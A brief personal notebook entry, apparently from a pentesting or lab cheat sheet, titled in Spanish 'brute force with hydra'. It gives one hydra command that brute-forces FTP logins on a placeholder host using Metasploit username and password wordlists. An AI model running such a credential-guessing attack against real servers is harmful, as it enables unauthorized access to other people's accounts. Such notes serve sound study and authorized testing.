---
created: 2024-12-21

---
----------------
- tags: #linux #ftp #bruteforce
------------

## Fuerza bruta con hydra

	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/unix_passwords.txt x.x.x.x -t 4 ftp


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
